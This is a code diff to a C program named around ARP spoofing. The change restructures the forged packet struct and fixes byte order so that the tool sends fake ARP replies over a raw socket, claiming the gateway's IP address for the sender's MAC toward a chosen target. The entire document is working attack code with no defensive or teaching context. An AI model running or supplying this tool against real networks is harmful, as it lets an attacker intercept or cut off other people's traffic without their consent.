@@ -44,12 +44,26 @@ typedef struct
 
 typedef struct
 {
-	ETH_HEADER eth_header;
-	ARP_HEADER arp_header;
-	char pad[18];
+//	ETH_HEADER eth_header;
+//	ARP_HEADER arp_header;
+	u_char eth_mac_dst[6];
+	u_char eth_mac_src[6];
+	u_short type;
+	
+	u_short hw_type;
+	u_short protocol_type;
+	u_char hw_len;
+	u_char protocol_len;
+	u_short op;
+	u_char mac_src[6];
+	u_char ip_src[4];
+	u_char mac_dst[6];
+	u_char ip_dst[4];
+	
+	char pad[4];
 }ARP_CHEAT;
 
-int arp_spoof(ARP_CHEAT *arp, char * interface_name)
+int arp_spoof(ARP_CHEAT *arp, char *interface_name)
 {
 	int sockfd = -1;
 	int ret = -1;
@@ -57,7 +71,7 @@ int arp_spoof(ARP_CHEAT *arp, char * interface_name)
 	struct sockaddr_ll addr;
 	
 	memset(&arp_send, 0, sizeof(arp_send));
-	memcpy(&arp_send, arp, sizeof(arp_send));
+	memcpy(&arp_send, arp, sizeof(ARP_CHEAT));
 
 	sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
 	if (sockfd < 0)
@@ -135,21 +149,22 @@ int main(int argc, char **argv)
 	myip = get_ipaddr_macaddr(if_name, mac_src);
 	get_target_mac_addr(if_name, tip, mac_dst);
 	
-	memcpy(&arpspoof.eth_header.mac_dst, mac_dst, sizeof(mac_dst));
-	memcpy(&arpspoof.eth_header.mac_src, mac_src, sizeof(mac_src));
-	arpspoof.eth_header.type = 0x0806;
+	memcpy(&arpspoof.eth_mac_dst, mac_dst, sizeof(mac_dst));
+	memcpy(&arpspoof.eth_mac_src, mac_src, sizeof(mac_src));
+	arpspoof.type = htons(0x0806);
 	
-	arpspoof.arp_header.hw_type = htons(ARPHRD_ETHER);
-	arpspoof.arp_header.protocol_type = htons(ETH_P_IP);
-	arpspoof.arp_header.hw_len = 6;
-	arpspoof.arp_header.protocol_len = 4;
-	arpspoof.arp_header.op = htons(2);
+	arpspoof.hw_type = htons(ARPHRD_ETHER);
+	arpspoof.protocol_type = htons(ETH_P_IP);
+	arpspoof.hw_len = 6;
+	arpspoof.protocol_len = 4;
+	arpspoof.op = htons(2);
 
-	memcpy(&arpspoof.arp_header.mac_src, mac_src, sizeof(mac_src));
-	memcpy(&arpspoof.arp_header.ip_src, &gip, 4);
-	memcpy(&arpspoof.arp_header.mac_dst, mac_dst, sizeof(mac_dst));
-	memcpy(&arpspoof.arp_header.ip_dst, &tip, 4);
+	memcpy(&arpspoof.mac_src, mac_src, sizeof(mac_src));
+	memcpy(&arpspoof.ip_src[0], &gip, 4);
+	memcpy(&arpspoof.mac_dst, mac_dst, sizeof(mac_dst));
+	memcpy(&arpspoof.ip_dst[0], &tip, 4);
 
+	printf("sizeof(arpspoof) = %d\n", sizeof(arpspoof));
 	printf("build arp packet success, start arp spoof.\n");
 	arp_spoof(&arpspoof, if_name);
 	
